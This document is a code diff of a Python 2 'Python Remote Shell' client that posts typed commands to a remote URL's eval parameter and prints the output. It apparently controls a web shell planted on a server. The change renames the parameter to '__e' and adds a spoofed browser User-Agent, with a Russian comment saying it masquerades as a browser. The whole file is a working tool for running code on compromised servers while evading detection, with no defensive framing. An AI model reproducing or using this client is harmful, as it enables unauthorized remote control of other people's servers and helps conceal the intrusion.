@@ -1,6 +1,7 @@
 # -*- coding: utf-8 -*-
 import sys
 import urllib
+import urllib2
 
 class Shell(object):
     def __init__(self, url, encoding, **kwargs):
@@ -8,7 +9,11 @@ class Shell(object):
         self.encoding = encoding
 
     def eval(self, s):
-        res = urllib.urlopen(self.url, 'eval=' + urllib.quote(s.encode(self.encoding)))
+        req = urllib2.Request(self.url, '__e=' + urllib.quote(s.encode(self.encoding)), {
+            # маскируемся под браузер
+            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:17.0) Gecko/20100101 Firefox/17.0',
+        })
+        res = urllib2.urlopen(req)
         return res.read().decode(self.encoding)
 
 def main(url, encoding):
@@ -18,9 +23,11 @@ def main(url, encoding):
     print("""Python Remote Shell ver 0.1
 Copyright 2013 tz4678@gmail.com""")
     while True:
-        v = raw_input('shell> ').decode(sys.stdin.encoding)
+        cmd = raw_input('shell> ').decode(sys.stdin.encoding)
         try:
-            print('output: ' + shell.eval(v))
+            out = shell.eval(cmd)
+            if out:
+                print(out)
         except Exception, e:
             print('An exception was caught: {}'.format(e))
 
